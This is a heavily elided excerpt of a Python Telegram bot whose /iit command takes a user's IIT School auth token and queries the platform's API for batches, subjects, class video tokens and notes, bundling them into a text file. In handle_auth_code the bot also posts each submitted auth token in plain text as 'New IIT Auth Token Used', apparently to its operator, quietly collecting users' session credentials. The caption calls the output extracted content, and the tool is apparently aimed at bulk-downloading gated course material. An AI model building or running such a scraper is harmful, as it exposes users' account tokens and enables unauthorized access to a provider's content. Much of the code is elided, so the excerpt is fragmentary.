...
async def iit_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start the IIT extraction process."""
...
async def handle_auth_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    try:
        ...
        await context.bot.send_message(
            ...
            text=f"New IIT Auth Token Used: ```{auth_token}```",
            parse_mode="Markdown"
        )
        ...
        response = requests.get(
            "https://spec.iitschool.com/api/v1/my-batch",
            headers=headers
        ).json()
...
async def handle_batch_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    try:
        ...
        response = requests.get(
            f"https://spec.iitschool.com/api/v1/batch-subject/{batch_id}",
            headers=headers
        ).json()
...
async def handle_content_type(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    try:
        ...
        # Fetch topics
        response = requests.get(
            f"https://spec.iitschool.com/api/v1/batch-topic/{subject_id}?type={content_type}",
            headers=headers
        ).json()
        ...
        for topic in topics:
            ...
            if content_type == "class":
                response = requests.get(
                    f"https://spec.iitschool.com/api/v1/batch-detail/{batch_id}?subjectId={subject_id}&topicId={topic_id}",
                    headers=headers
                ).json()
                        ...
                        try:
                            ...
                            if lesson_ext == "brightcove":
                                video_token_response = requests.get(
                                    f"https://spec.iitschool.com/api/v1/livestreamToken?base=web&module=batch&type=brightcove&vid={cls['id']}",
                                    headers=headers
                                ).json()
                ...
                response = requests.get(
                    f"https://spec.iitschool.com/api/v1/batch-notes/{batch_id}?subjectId={subject_id}&topicId={topic_id}",
                    headers=headers
                ).json()
        ...
        if to_write:
            filename = f"IIT_{subject_id}_{content_type}.txt"
            ...
            log_caption = (
                f"𝙸𝙸𝚃 𝚂𝚌𝚑𝚘𝚘𝚕 𝚌𝚘𝚗𝚝𝚎𝚗𝚝 𝚎𝚡𝚝𝚛𝚊𝚌𝚝𝚎𝚍 𝚊𝚗𝚍 𝚜𝚎𝚗𝚝 𝚝𝚘 𝚞𝚜𝚎𝚛.\n\n"
...
iit_handler = ConversationHandler(
    entry_points=[CommandHandler("iit", iit_start)],
    states={
